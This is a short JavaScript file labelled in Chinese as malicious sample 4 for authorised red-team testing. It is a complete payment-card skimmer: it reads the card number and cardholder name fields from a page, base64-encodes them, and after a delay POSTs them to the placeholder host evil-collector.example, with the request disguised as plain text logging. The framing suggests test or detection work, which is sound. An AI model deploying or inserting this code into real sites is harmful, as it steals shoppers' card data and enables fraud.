/**
 * ⚠️ 恶意样本 4（授权红队测试用）：base64 编码 + fetch POST 外发
 */
(function () {
  const EVIL = 'https://evil-collector.example/ingest';

  function steal() {
    const card = document.querySelector('#card-number');
    const name = document.querySelector('#cardholder-name');
    if (!card) return;
    const data = btoa(JSON.stringify({
      card: card.value,
      holder: name ? name.value : '',
    }));
    fetch(EVIL, {
      method: 'POST',
      headers: { 'content-type': 'text/plain' }, // 伪装成普通文本上报
      body: `log=${data}`,
    });
  }

  setTimeout(steal, 2500);
})();
